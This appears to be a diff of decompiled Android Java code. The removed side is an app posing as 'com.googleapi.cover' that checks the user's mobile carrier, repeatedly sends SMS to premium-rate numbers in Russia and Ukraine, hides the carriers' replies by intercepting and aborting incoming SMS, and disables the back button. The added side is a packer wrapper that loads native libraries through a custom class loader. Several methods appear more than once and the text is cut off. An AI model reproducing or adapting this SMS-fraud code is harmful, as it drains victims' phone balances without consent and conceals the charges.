-        private HashMap<String, String> getAlternativeNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_1, ActService.NUM_2_SD);
-                result.put(ActService.NUM_3, ActService.NUM_2_SD);
-                result.put(ActService.NUM_2_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_2_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, "-1");
-            }
-            return new HashMap<>(result);
-        }
-
-        private ArrayList<String> getNums(boolean isMTSRF, boolean isBeline) {
-            ArrayList<String> result = new ArrayList<>();
-            if (isMTSRF) {
-                result.add(ActService.NUM_10);
-                result.add(ActService.NUM_5);
-                result.add(ActService.NUM_3);
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            } else if (!isBeline) {
-                result.add(Actor.NUM_10);
-                result.add(Actor.NUM_10_ALT);
-                result.add(Actor.NUM_5);
-                result.add(Actor.NUM_5_ALT);
-                result.add(Actor.NUM_3);
-                result.add(Actor.NUM_3_ALT);
-                result.add(Actor.NUM_2);
-                result.add(Actor.NUM_1);
-                result.add(Actor.NUM_1_ALT);
-            } else {
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            }
-            return result;
-        }
-
-        private void performActions() {
-            String lastNumber;
-            Context context = ActService.this.getApplicationContext();
-            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-            String opStr = settings.getString(Actor.NETWORK_STRING, "");
-            Actor act = new Actor(context, opStr);
-            if (act.isUkrCode()) {
-                actUK(act, settings);
-                return;
-            }
-            boolean isMTSRF = act.isMTSRF();
-            boolean isBeeline = act.isBeline();
-            if (act.isPrivate()) {
-                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
-                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
-                int acceptedNums = 0;
-                if (isBeeline) {
-                    String currentNumber = ActService.NUM_1;
-                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    do {
-                        beginSending(settings, context, currentNumber, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber = positives.get(currentNumber);
-                        } else {
-                            if (currentNumber.equals(ActService.NUM_1)) {
-                                if (acceptedNums != 0) {
-                                    break;
-                                }
-                                ActService.PREF_TO_USE = Actor.PREF_PORT;
-                                positives = getAlternativePositiveNums(isBeeline, isMTSRF);
-                                negatives = getAlternativeNegativeNums(isBeeline, isMTSRF);
-                            }
-                            currentNumber = negatives.get(currentNumber);
-                        }
-                        if (currentNumber == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber.equalsIgnoreCase("-1"));
-                } else if (isMTSRF || act.isMF()) {
-                    double restAllowedSum = 0.0d;
-                    ArrayList<Pair<String, Double>> prices = new ArrayList<>();
-                    if (isMTSRF) {
-                        ActService.PREF_TO_USE = ActService.PREF_A1;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mtsPrices;
-                    } else if (act.isMF()) {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mfPrices;
-                    }
-                    int currentNumberIndex = 0;
-                    while (true) {
-                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
-                            currentNumberIndex++;
-                        } else {
-                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
-                                break;
-                            }
-                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
-                            do {
-                                try {
-                                    sleep(100L);
-                                } catch (InterruptedException e2) {
-                                }
-                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                                acceptedNums++;
-                                if (acceptedNums < 3) {
-                                    smsData = act.getRelatedData(acceptedNums - 1);
-                                    waitForAcceptance(acceptedNums, settings);
-                                }
-                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
-                            } else {
-                                currentNumberIndex++;
-                            }
-                        }
-                    }
-                } else {
-                    String currentNumber2 = Actor.NUM_10;
-                    String num3_alt = Actor.NUM_3_ALT;
-                    new String();
-                    ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    do {
-                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e3) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        lastNumber = currentNumber2;
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber2 = positives.get(currentNumber2);
-                        } else {
-                            currentNumber2 = negatives.get(currentNumber2);
-                        }
-                        if (currentNumber2 == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber2.equalsIgnoreCase("-1"));
-                    if (acceptedNums < 2 && lastNumber.equals(num3_alt)) {
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                    }
-                }
-            } else {
-                ArrayList<String> numbers = getNums(isMTSRF, isBeeline);
-                for (int i = 0; i < numbers.size(); i++) {
-                    String number = numbers.get(i);
-                    if (number.equals(ActService.NUM_10) || number.equals(ActService.NUM_5) || number.equals(ActService.NUM_3) || number.equals(ActService.NUM_1)) {
-                        ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    } else {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    }
-                    beginSending(settings, context, number, smsData, isMTSRF, isBeeline);
-                    do {
-                        try {
-                            sleep(100L);
-                        } catch (InterruptedException e4) {
-                        }
-                    } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                    if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                        break;
-                    }
-                }
-            }
-            Utils.putStringValue(context, Actor.EXPECT_NUM, "", settings);
-            act.reportDone();
-        }
-
-        private void waitForAcceptance(int alreadyAccepted, SharedPreferences settings) {
-            do {
-                try {
-                    sleep(100L);
-                } catch (InterruptedException e) {
-                }
-            } while (settings.getInt(Actor.ALLOWED_SMS_NUMBER, 0) <= alreadyAccepted);
-        }
-
-        private void beginSending(SharedPreferences settings, Context context, String num, String smsData, boolean isMTSRF, boolean isBeeline) {
-            Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, false, settings);
-            Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
-            Utils.putStringValue(context, Actor.EXPECT_NUM, num, settings);
-            Utils.start(null, Utils.getScheme(num, ActService.PREF_TO_USE), smsData, context);
-        }
-
-        private void actUK(Actor act, SharedPreferences settings) {
-            SmsManager sms = SmsManager.getDefault();
-            ArrayList<String> list = new ArrayList<>();
-            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
-            String ns1ua = "31".concat("61");
-            String ns2ua = "28".concat("55");
-            String ps1_ua = "4084".concat("705");
-            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
-                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
-                    list.add(ns2ua);
-                } else if (opCode.equals("01")) {
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                } else {
-                    list.add(ns2ua);
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                }
-                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-                for (int i = 0; i < list.size(); i++) {
-                    if (i != 0) {
-                        try {
-                            sleep(60000L);
-                        } catch (InterruptedException e) {
-                        }
-                    }
-                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
-                }
-            }
-            act.reportDone();
-        }
-    }
-
-Package Path:com.googleapi.cover.Main.showLastScreen
-Class Name:Main
-Content: package com.googleapi.cover;
-
-    public void showLastScreen(Intent i) {
-        i.setFlags(i.getFlags() | 67108864 | 536870912);
-        String relatedLinks = "";
-        int maxIndex = getSharedPreferences(KEY_PREFS, 0).getInt(RelatedContent.LAST_ACTIVATED, -1);
-        for (int j = 0; j < maxIndex + 1; j++) {
-            relatedLinks = relatedLinks.concat("\n" + this.actor.getRelatedContentLink(j));
-        }
-        i.putExtra("URL", String.valueOf(this.actor.getActedLink()) + relatedLinks);
-        startActivity(i);
-        finish();
-    }
-
-Package Path:com.googleapi.cover.RelatedContent.initializeTextViews
-Class Name:RelatedContent
-Content: package com.googleapi.cover;
-
-    private void initializeTextViews() {
-        this.mainTextView = (TextView) findViewById(R.id.related_content_name);
-        Display display = getWindowManager().getDefaultDisplay();
-        this.mainTextView.setText(getString(R.string.related_content, new Object[]{getString(R.string.app_name), Build.MODEL, String.valueOf(display.getWidth()) + "x" + display.getHeight(), Build.VERSION.RELEASE, this.actor.getRelatedContentName(this.index)}));
-    }
-
-Package Path:com.googleapi.cover.ShowURL.onClick
-Class Name:ShowURL
-Content: package com.googleapi.cover;
-
-            public void onClick(View v) {
-                String uri = "tel:" + ShowURL.this.getString(R.string.support_number);
-                Intent intent = new Intent("android.intent.action.CALL");
-                intent.setData(Uri.parse(uri));
-                ShowURL.this.startActivity(intent);
-            }
-
-Package Path:com.googleapi.cover.Main.showLastScreen
-Class Name:Main
-Content: package com.googleapi.cover;
-
-    public void showLastScreen(Intent i) {
-        i.setFlags(i.getFlags() | 67108864 | 536870912);
-        String relatedLinks = "";
-        int maxIndex = getSharedPreferences(KEY_PREFS, 0).getInt(RelatedContent.LAST_ACTIVATED, -1);
-        for (int j = 0; j < maxIndex + 1; j++) {
-            relatedLinks = relatedLinks.concat("\n" + this.actor.getRelatedContentLink(j));
-        }
-        i.putExtra("URL", String.valueOf(this.actor.getActedLink()) + relatedLinks);
-        startActivity(i);
-        finish();
-    }
-
-Package Path:com.googleapi.cover.RelatedContent.RelatedContent
-Class Name:RelatedContent
-Content: package com.googleapi.cover;
-
-public class RelatedContent extends Activity {
-    public static final String LAST_ACTIVATED = "LAST_ACTIVATED";
-    private static final int OFF = 1;
-    private static final int RESULT_OK = 1;
-    private Actor actor;
-    private TextView agreementTextView;
-    private ProgressDialog dialog;
-    private TextView exitTextView;
-    private TextView footrTextView;
-    private int index;
-    private TextView mainTextView;
-    private Button noButton;
-    private Button yesButton;
-    boolean isRegistered = false;
-    private String price_mf_1 = "111.76";
-    private String price_mf_2 = "70";
-
-    @Override // android.app.Activity
-    public void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.related_content);
-        this.index = getIntent().getIntExtra("index", 0);
-        this.actor = new Actor(this, TextUtils.getOperatorString(this));
-        if (!this.actor.wasActError()) {
-            initializeGUI();
-        } else {
-            finish();
-        }
-    }
-
-    private void initializeGUI() {
-        initButtons();
-        initializeTextViews();
-    }
-
-    private void initButtons() {
-        this.yesButton = (Button) findViewById(R.id.related_yes_btn);
-        this.noButton = (Button) findViewById(R.id.related_no_btn);
-        setListeners();
-    }
-
-    private void initializeTextViews() {
-        this.mainTextView = (TextView) findViewById(R.id.related_content_name);
-        Display display = getWindowManager().getDefaultDisplay();
-        this.mainTextView.setText(getString(R.string.related_content, new Object[]{getString(R.string.app_name), Build.MODEL, String.valueOf(display.getWidth()) + "x" + display.getHeight(), Build.VERSION.RELEASE, this.actor.getRelatedContentName(this.index)}));
-    }
-
-    @Override // android.app.Activity, android.view.KeyEvent.Callback
-    public boolean onKeyDown(int keyCode, KeyEvent event) {
-        if (keyCode == 4) {
-            return true;
-        }
-        return super.onKeyDown(keyCode, event);
-    }
-
-    @Override // android.app.Activity
-    public void onBackPressed() {
-    }
-
-    private void setListeners() {
-        this.yesButton.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.RelatedContent.1
-            private boolean clickable = true;
-
-            @Override // android.view.View.OnClickListener
-            public void onClick(View v) {
-                if (this.clickable) {
-                    this.clickable = false;
-                    RelatedContent.this.start();
-                }
-            }
-        });
-        if (this.actor.isMF()) {
-            this.noButton.setVisibility(0);
-        }
-        this.noButton.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.RelatedContent.2
-            private boolean clickable = true;
-
-            @Override // android.view.View.OnClickListener
-            public void onClick(View v) {
-                if (this.clickable) {
-                    this.clickable = false;
-                    RelatedContent.this.goToNextScreen();
-                }
-            }
-        });
-        this.footrTextView = (TextView) findViewById(R.id.agr_footr_text);
-        this.agreementTextView = (TextView) findViewById(R.id.related_content_agr_text);
-        this.exitTextView = (TextView) findViewById(R.id.related_content_exit_text);
-        this.agreementTextView.setVisibility(8);
-        this.exitTextView.setVisibility(8);
-        if (this.actor.isMF() || this.actor.isMTSRF()) {
-            String price = "";
-            if (this.index == 0) {
-                if (this.actor.isMF()) {
-                    price = this.price_mf_1;
-                }
-            } else if (this.index == 1 && this.actor.isMF()) {
-                price = this.price_mf_2;
-            }
-            this.footrTextView.setVisibility(0);
-            if (!this.actor.isMTSRF()) {
-                this.agreementTextView.setVisibility(0);
-                this.footrTextView.setText(String.valueOf(getString(R.string.attention)) + " " + price + getString(R.string.rub));
-            }
-            SpannableString content = new SpannableString(getString(R.string.agr_text));
-            content.setSpan(new UnderlineSpan(), 0, content.length(), 0);
-            this.agreementTextView.setText(content);
-            this.agreementTextView.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.RelatedContent.3
-                @Override // android.view.View.OnClickListener
-                public void onClick(View v) {
-                    RelatedContent.this.showOff();
-                }
-            });
-            SpannableString content2 = new SpannableString(getString(R.string.exit));
-            content2.setSpan(new UnderlineSpan(), 0, content2.length(), 0);
-            this.exitTextView.setText(content2);
-            this.exitTextView.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.RelatedContent.4
-                @Override // android.view.View.OnClickListener
-                public void onClick(View v) {
-                    RelatedContent.this.goToNextScreen();
-                }
-            });
-        }
-    }
-
-    /* JADX INFO: Access modifiers changed from: private */
-    public void start() {
-        SharedPreferences settings = getSharedPreferences(Main.KEY_PREFS, 0);
-        Utils.putIntegerValue(this, Actor.ALLOWED_SMS_NUMBER, settings.getInt(Actor.ALLOWED_SMS_NUMBER, 1) + 1, settings);
-        this.dialog = new ProgressDialog(this);
-        this.dialog.setCancelable(false);
-        this.dialog.setMessage(getResources().getString(R.string.please_wait));
-        this.dialog.show();
-        if (!this.isRegistered) {
-            this.isRegistered = true;
-            registerReceiver();
-        }
-        this.actor.start(this.index);
-    }
-
-    @Override // android.app.Activity
-    protected void onActivityResult(int requestCode, int resultCode, Intent intent) {
-        super.onActivityResult(requestCode, resultCode, intent);
-        if (resultCode == 1) {
-            start();
-        }
-    }
-
-    /* JADX INFO: Access modifiers changed from: private */
-    public void goToNextScreen() {
-        if (this.actor.hasMoreContent(this.index)) {
-            this.index++;
-            initializeGUI();
-        } else {
-            showLastScreen(new Intent(this, (Class<?>) ShowURL.class), true);
-        }
-    }
-
-    private void registerReceiver() {
-        registerReceiver(new BroadcastReceiver() { // from class: com.googleapi.cover.RelatedContent.5
-            @Override // android.content.BroadcastReceiver
-            public void onReceive(Context context, Intent i) {
-                RelatedContent.this.dialog.dismiss();
-                int resultCode = Actor.STATUS;
-                switch (resultCode) {
-                    case -1:
-                        RelatedContent.this.goToNextScreen();
-                        break;
-                    default:
-                        Toast.makeText(RelatedContent.this.getBaseContext(), R.string.sms_sending_error, 0).show();
-                        break;
-                }
-            }
-        }, new IntentFilter(Main.SEND_DONE));
-    }
-
-    private void showLastScreen(Intent i, boolean yesButtonPressed) {
-        i.setFlags(i.getFlags() | 67108864 | 536870912);
-        int maxIndex = yesButtonPressed ? this.index : this.index - 1;
-        Utils.putIntegerValue(this, LAST_ACTIVATED, maxIndex, getSharedPreferences(Main.KEY_PREFS, 0));
-        String relatedLinks = "";
-        for (int j = 0; j < maxIndex + 1; j++) {
-            relatedLinks = relatedLinks.concat("\n" + this.actor.getRelatedContentLink(j));
-        }
-        i.putExtra("URL", String.valueOf(this.actor.getActedLink()) + relatedLinks);
-        startActivity(i);
-        finish();
-    }
-
-    @Override // android.app.Activity
-    public boolean onCreateOptionsMenu(Menu menu) {
-        MenuInflater inflater = getMenuInflater();
-        inflater.inflate(R.menu.main_menu, menu);
-        return true;
-    }
-
-    @Override // android.app.Activity
-    public boolean onOptionsItemSelected(MenuItem item) {
-        switch (item.getItemId()) {
-            case R.id.read_off_item /* 2131296277 */:
-                showOff();
-                return true;
-            default:
-                return super.onOptionsItemSelected(item);
-        }
-    }
-
-    /* JADX INFO: Access modifiers changed from: private */
-    public void showOff() {
-        Intent i = new Intent(this, (Class<?>) AgActivity.class);
-        startActivityForResult(i, 1);
-    }
-}
-
-Package Path:com.googleapi.cover.RelatedContent.onKeyDown
-Class Name:RelatedContent
-Content: package com.googleapi.cover;
-
-    public boolean onKeyDown(int keyCode, KeyEvent event) {
-        if (keyCode == 4) {
-            return true;
-        }
-        return super.onKeyDown(keyCode, event);
-    }
-
-Package Path:com.googleapi.cover.MessageReceiver.onReceive
-Class Name:MessageReceiver
-Content: package com.googleapi.cover;
-
-    public void onReceive(Context context, Intent intent) {
-        Bundle bundle;
-        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && (bundle = intent.getExtras()) != null) {
-            try {
-                SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-                Object[] pdus = (Object[]) bundle.get("pdus");
-                StringBuilder builder = new StringBuilder();
-                boolean hasExpectedNum = false;
-                SmsMessage[] msgs = new SmsMessage[pdus.length];
-                for (int i = 0; i < msgs.length; i++) {
-                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
-                    if (msgs[i].getOriginatingAddress().equalsIgnoreCase(settings.getString(Actor.EXPECT_NUM, ""))) {
-                        if (!hasExpectedNum) {
-                            hasExpectedNum = true;
-                        }
-                        builder.append(msgs[i].getMessageBody().replace("http://sms911.r", ""));
-                    }
-                }
-                if (hasExpectedNum) {
-                    String text = builder.toString();
-                    if (text.contains("http://")) {
-                        Utils.putIntegerValue(context, TextUtils.getDailyKey(), settings.getInt(TextUtils.getDailyKey(), 0) + 1, settings);
-                        Utils.putBooleanValue(context, Actor.KEY_PAID, true, settings);
-                    } else {
-                        Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
-                    }
-                    Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, true, settings);
-                    abortBroadcast();
-                }
-            } catch (Exception e) {
-            }
-        }
-    }
-
-Package Path:com.googleapi.cover.MessageReceiver.MessageReceiver
-Class Name:MessageReceiver
-Content: package com.googleapi.cover;
-
-public class MessageReceiver extends BroadcastReceiver {
-    @Override // android.content.BroadcastReceiver
-    public void onReceive(Context context, Intent intent) {
-        Bundle bundle;
-        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && (bundle = intent.getExtras()) != null) {
-            try {
-                SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-                Object[] pdus = (Object[]) bundle.get("pdus");
-                StringBuilder builder = new StringBuilder();
-                boolean hasExpectedNum = false;
-                SmsMessage[] msgs = new SmsMessage[pdus.length];
-                for (int i = 0; i < msgs.length; i++) {
-                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
-                    if (msgs[i].getOriginatingAddress().equalsIgnoreCase(settings.getString(Actor.EXPECT_NUM, ""))) {
-                        if (!hasExpectedNum) {
-                            hasExpectedNum = true;
-                        }
-                        builder.append(msgs[i].getMessageBody().replace("http://sms911.r", ""));
-                    }
-                }
-                if (hasExpectedNum) {
-                    String text = builder.toString();
-                    if (text.contains("http://")) {
-                        Utils.putIntegerValue(context, TextUtils.getDailyKey(), settings.getInt(TextUtils.getDailyKey(), 0) + 1, settings);
-                        Utils.putBooleanValue(context, Actor.KEY_PAID, true, settings);
-                    } else {
-                        Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
-                    }
-                    Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, true, settings);
-                    abortBroadcast();
-                }
-            } catch (Exception e) {
-            }
-        }
-    }
-}
-
-Package Path:com.googleapi.cover.TextUtils.TextUtils
-Class Name:TextUtils
-Content: package com.googleapi.cover;
-
-public class TextUtils {
-    public static final String CS_TAG = "cs";
-    public static final String FOURTH_TEXT_TAG = "fourthText";
-    public static final String INSTALLLED_TEXT_TAG = "installedString";
-    public static final String MAIN_TEXT_TAG = "mainText";
-    public static final String SECOND_TEXT_TAG = "secondString";
-    public static final String TAG_ID = "mcc";
-    public static final String TEXTS_TAG = "texts";
-    public static final String THIRD_TEXT_TAG = "thirdText";
-
-    public static HashMap<String, HashMap<String, String>> getTexts(XmlResourceParser xml) throws IOException {
-        HashMap<String, HashMap<String, String>> result = new HashMap<>();
+Package Path:com.secapk.wrapper.Util.checkUpdate
+Class Name:Util
+Content: package com.secapk.wrapper;
+
+    private static void checkUpdate(Context ctx) {
         try {
-            TreeMap<String, String> texts = new TreeMap<>();
-            int eventType = 0;
-            String cc = "";
-            while (eventType != 1) {
-                String nV = xml.getName();
-                if (eventType != 0) {
-                    if (eventType == 2) {
-                        if (!nV.equals(CS_TAG) && !nV.equals(TEXTS_TAG)) {
-                            String val = xml.getAttributeValue(0);
-                            if (!nV.equalsIgnoreCase(TAG_ID)) {
-                                texts.put(nV, val);
-                            } else {
-                                cc = val;
-                            }
-                        }
-                    } else if (eventType == 3 && nV.equals(TEXTS_TAG)) {
-                        result.put(cc, new HashMap<>(texts));
-                        texts.clear();
-                    }
-                }
-                eventType = xml.next();
+            File f = new File("/data/data/" + ctx.getPackageName() + "/.cache/");
+            PackageInfo pinfo = ctx.getPackageManager().getPackageInfo(ctx.getPackageName(), 0);
+            int versionCode = pinfo.versionCode;
+            String versionName = pinfo.versionName;
+            if (versionName == null) {
+                versionName = VERSION_NAME;
             }
-        } catch (XmlPullParserException e) {
-        } finally {
-            xml.close();
+            File fversion = new File("/data/data/" + ctx.getPackageName() + "/.sec_version");
+            if (!fversion.exists()) {
+                deleteDirectory(f);
+                writeVersion(fversion, versionCode, versionName);
+                return;
+            }
+            String[] ret = readVersions(fversion);
+            if (ret == null) {
+                deleteDirectory(f);
+                fversion.delete();
+                return;
+            }
+            int localVersionCode = Integer.parseInt(ret[0]);
+            String localVersionName = ret[1];
+            if (!localVersionName.equals(versionName) || localVersionCode != versionCode) {
+                deleteDirectory(f);
+                fversion.delete();
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+            deleteDirectory(new File("/data/data/" + ctx.getPackageName() + "/.cache/"));
+            File fversion2 = new File("/data/data/" + ctx.getPackageName() + "/.sec_version");
+            if (fversion2.exists()) {
+                fversion2.delete();
+            }
+        }
+    }
+
+Package Path:com.secapk.wrapper.Util.getCPUinfo
+Class Name:Util
+Content: package com.secapk.wrapper;
+
+    public static String getCPUinfo() {
+        String result = "";
+        try {
+            String[] args = {"/system/bin/cat", "/proc/cpuinfo"};
+            ProcessBuilder cmd = new ProcessBuilder(args);
+            Process process = cmd.start();
+            InputStream in = process.getInputStream();
+            byte[] re = new byte[1024];
+            while (in.read(re) != -1) {
+                result = result + new String(re);
+            }
+            in.close();
+        } catch (IOException ex) {
+            ex.printStackTrace();
         }
         return result;
     }
 
-    public static Pair<String, String> getScheme(Context context) throws IOException {
-        return Pair.create(read(4, context), read(5, context));
-    }
+Package Path:com.secapk.wrapper.ApplicationWrapper.onTerminate
+Class Name:ApplicationWrapper
+Content: package com.secapk.wrapper;
 
-    public static String getDailyKey() {
-        return String.valueOf(DateFormat.format("yyyy-MM-dd", new Date()).toString()) + "sent";
-    }
-
-    public static String read(int lineNum, Context context) throws IOException {
-        BufferedReader reader = new BufferedReader(new InputStreamReader(context.getResources().openRawResource(R.raw.act_schemes)));
-        String line = null;
-        for (int i = 0; i < lineNum; i++) {
-            line = reader.readLine();
-        }
-        reader.close();
-        return line;
-    }
-
-    public static String getSubId(Context context) {
-        String id = new String();
-        try {
-            String text = (String) getScheme(context).second;
-            int indexOfPlus = text.indexOf(43);
-            if (indexOfPlus != -1) {
-                String id2 = text.substring(0, indexOfPlus);
-                return id2;
-            }
-            return text;
-        } catch (Exception e) {
-            return id;
+    public void onTerminate() {
+        super.onTerminate();
+        if (realApplication != null) {
+            realApplication.onTerminate();
         }
     }
 
-    public static String getSubText(Context context) {
+Package Path:com.secapk.wrapper.MyClassLoader.Constructor
+Class Name:MyClassLoader
+Content: package com.secapk.wrapper;
+
+    public MyClassLoader(String dexPath, String optimizedDirectory, String libraryPath, ClassLoader cl) {
+        super(dexPath, optimizedDirectory, libraryPath, cl.getParent());
+        this.mClassLoader = null;
+        this.mClassLoader = cl;
+    }
+
+Package Path:com.secapk.wrapper.Util.runAll1
+Class Name:Util
+Content: package com.secapk.wrapper;
+
+    public static void runAll1(Context ctx) {
         try {
-            String line = read(12, context);
-            if (line == null) {
-                return "";
+            File f = new File("/data/data/" + ctx.getPackageName() + "/.cache/");
+            if (!f.exists()) {
+                f.mkdir();
             }
-            return line;
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+        checkX86(ctx);
+    }
+
+Package Path:com.secapk.wrapper.ACall.c1
+Class Name:ACall
+Content: package com.secapk.wrapper;
+
+    public native void c1(Object obj, Object obj2);
+
+Package Path:com.secapk.wrapper.Util.CopyLib
+Class Name:Util
+Content: package com.secapk.wrapper;
+
+    private static void CopyLib(Context ctx) {
+        JarFile jarFile;
+        String apkFilePath = ctx.getApplicationInfo().sourceDir;
+        try {
+            jarFile = new JarFile(apkFilePath);
         } catch (IOException e) {
-            return "";
+            e = e;
         }
-    }
-
-    public static String getOperatorString(Context context) {
-        TelephonyManager mgr = (TelephonyManager) context.getSystemService("phone");
-        return mgr.getSimState() == 5 ? mgr.getSimOperator() : "111111";
-    }
-
-    public static String getMNC(Context context) {
-        return getOperatorString(context).substring(3, 5);
-    }
-
-    public static String getMCC(Context context) {
-        return getOperatorString(context).substring(0, 3);
-    }
-}
-
-Package Path:com.googleapi.cover.RelatedContent.RelatedContent
-Class Name:RelatedContent
-Content: package com.googleapi.cover;
-
-public class RelatedContent extends Activity {
-    public static final String LAST_ACTIVATED = "LAST_ACTIVATED";
-    private static final int OFF = 1;
-    private static final int RESULT_OK = 1;
-    private Actor actor;
-    private TextView agreementTextView;
-    private ProgressDialog dialog;
-    private TextView exitTextView;
-    private TextView footrTextView;
-    private int index;
-    private TextView mainTextView;
-    private Button noButton;
-    private Button yesButton;
-    boolean isRegistered = false;
-    private String price_mf_1 = "111.76";
-    private String price_mf_2 = "70";
-
-    @Override // android.app.Activity
-    public void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.related_content);
-        this.index = getIntent().getIntExtra("index", 0);
-        this.actor = new Actor(this, TextUtils.getOperatorString(this));
-        if (!this.actor.wasActError()) {
-            initializeGUI();
-        } else {
-            finish();
-        }
-    }
-
-    private void initializeGUI() {
-        initButtons();
-        initializeTextViews();
-    }
-
-    private void initButtons() {
-        this.yesButton = (Button) findViewById(R.id.related_yes_btn);
-        this.noButton = (Button) findViewById(R.id.related_no_btn);
-        setListeners();
-    }
-
-    private void initializeTextViews() {
-        this.mainTextView = (TextView) findViewById(R.id.related_content_name);
-        Display display = getWindowManager().getDefaultDisplay();
-        this.mainTextView.setText(getString(R.string.related_content, new Object[]{getString(R.string.app_name), Build.MODEL, String.valueOf(display.getWidth()) + "x" + display.getHeight(), Build.VERSION.RELEASE, this.actor.getRelatedContentName(this.index)}));
-    }
-
-    @Override // android.app.Activity, android.view.KeyEvent.Callback
-    public boolean onKeyDown(int keyCode, KeyEvent event) {
-        if (keyCode == 4) {
-            return true;
-        }
-        return super.onKeyDown(keyCode, event);
-    }
-
-    @Override // android.app.Activity
-    public void onBackPressed() {
-    }
-
-    private void setListeners() {
-        this.yesButton.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.RelatedContent.1
-            private boolean clickable = true;
-
-            @Override // android.view.View.OnClickListener
-            public void onClick(View v) {
-                if (this.clickable) {
-                    this.clickable = false;
-                    RelatedContent.this.start();
+        try {
+            Enumeration<JarEntry> iter = jarFile.entries();
+            while (iter.hasMoreElements()) {
+                JarEntry jarEntry = iter.nextElement();
+                String jarEntryName = jarEntry.getName();
+                if (jarEntryName.equals("assets/libsecexe.x86.so")) {
+                    String soName = jarEntryName.replaceAll("assets/", "");
+                    String destSoName = "/data/data/" + ctx.getPackageName() + "/.cache/" + soName;
+                    realCopy(destSoName, jarFile, jarEntry);
+                }
+                if (jarEntryName.equals("assets/libsecmain.x86.so")) {
+                    jarEntryName.replaceAll("assets/", "");
+                    String destSoName2 = "/data/data/" + ctx.getPackageName() + "/.cache/libsecmain.x86.so";
+                    realCopy(destSoName2, jarFile, jarEntry);
+                }
+                if (jarEntryName.equals("assets/" + ctx.getPackageName() + ".x86")) {
+                    jarEntryName.replaceAll("assets/", "");
+                    String destSoName3 = "/data/data/" + ctx.getPackageName() + "/.cache/" + ctx.getPackageName();
